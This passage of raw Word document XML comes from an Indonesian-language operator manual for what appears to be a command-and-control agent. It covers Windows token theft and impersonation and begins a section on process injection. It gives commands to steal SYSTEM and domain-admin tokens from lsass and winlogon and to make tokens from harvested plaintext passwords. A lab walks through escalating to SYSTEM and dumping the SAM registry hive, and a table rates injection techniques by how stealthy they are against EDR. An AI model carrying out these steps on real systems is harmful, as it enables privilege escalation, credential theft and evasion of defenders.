      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 10 — TOKEN MANIPULATION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Windows access tokens menentukan security context sebuah proses. Dengan memanipulasi token, agent dapat mengimpersonasi pengguna lain (termasuk SYSTEM atau Domain Admin) tanpa mengetahui password mereka.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>List Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># List semua token yang tersedia di sistem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token list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contoh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># PID   PROCESS          USER              PRIVILEGES</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 624   lsass.exe        NT AUTHORITY\SYSTEM  SeDebugPrivilege, SeTcbPrivilege...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 1234  winlogon.exe     CORP\john.doe     SeImpersonatePrivilege...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 4512  explorer.exe     CORP\administrator SeAssignPrimaryTokenPrivilege...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Token Impersonation (Steal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Steal token dari proses yang berjalan sebagai pengguna target. Paling umum digunakan untuk mengambil token SYSTEM dari lsass atau winlogon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Steal token dari proses SYSTEM (lsass PID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid 624 --wait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Token domain admin dari sesi logon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid 1234 --wait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Verifikasi token berubah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "whoami" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Output: NT AUTHORITY\SYSTEM  (atau domain admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Make Token (Pass-the-Password)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Buat token baru menggunakan credential yang sudah diketahui. Berguna setelah mendapat plaintext password dari LSASS dump atau browser credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Buat token dengan credential</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token make &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user john.doe \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --domain CORP \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --pass "CorpMail@2026!"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Jalankan perintah sebagai user tersebut</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "net use \\DC01\IPC$ /user:CORP\admin P@ssw0rd" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Revert Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Kembali ke token original agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token revert &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Token RunAs (Spawn Process dengan Token)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Spawn process baru menggunakan token curian</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token runas &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --pid 624 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --exe "C:\Windows\System32\cmd.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --args "/c whoami &gt; C:\Temp\out.txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Token manipulation membutuhkan SeImpersonatePrivilege atau SeAssignPrimaryTokenPrivilege. Jika agent berjalan sebagai service atau dengan token tertentu, privilege ini mungkin sudah tersedia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 10.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Privilege Escalation via Token Steal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>List semua token yang tersedia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token list &lt;agent-id&gt;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Identifikasi PID proses yang berjalan sebagai SYSTEM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 3:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Steal token dari proses tersebut.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid &lt;SYSTEM_PID&gt;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Verifikasi context sudah berubah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "whoami" --wait</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Lakukan tindakan yang butuh SYSTEM (e.g., baca file SAM).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "reg save HKLM\SAM C:\Temp\SAM" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 6:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Revert ke token semula.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token revert &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 11 — PROCESS INJECTION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Process injection memungkinkan menjalankan shellcode atau DLL di dalam proses lain. Teknik ini digunakan untuk menghindari deteksi berbasis proses (shellcode jalan di proses legitimate) dan menaikkan privilege (inject ke proses yang lebih privileged).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Injection Methods</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="2269"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Teknik</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Deskripsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Stealth</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Catatan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>CRT (inject remote)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>VirtualAllocEx + WriteProcessMemory + CreateRemoteThread</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Rendah</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Classic, banyak dideteksi EDR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>APC (inject remote)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>QueueUserAPC ke suspended thread</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sedang</w:t>
